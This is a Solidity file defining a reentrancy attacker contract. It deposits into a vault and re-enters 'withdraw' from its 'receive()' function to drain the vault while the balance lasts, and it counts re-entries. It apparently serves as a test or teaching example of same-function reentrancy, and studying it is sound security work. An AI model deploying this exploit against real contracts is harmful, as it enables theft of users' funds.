// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

/// @notice Recursive-withdraw attacker. Deposits a small amount, then
///         re-enters `withdraw` from its `receive()` on each payout.
contract SameFunctionAttacker {
    IVault public immutable vault;
    uint256 public attackAmount;
    uint256 public reentryCount;

    constructor(address _vault) {
        vault = IVault(_vault);
    }

    function attack(uint256 amount) external {
        attackAmount = amount;
        vault.deposit{value: amount}();
        vault.withdraw();
    }

    receive() external payable {
        // Recurse only while the vault can fund another withdrawal — otherwise
        // the innermost `withdraw` would revert and unwind the whole exploit.
        if (attackAmount > 0 && address(vault).balance >= attackAmount) {
            reentryCount++;
            vault.withdraw();
        }
    }
}
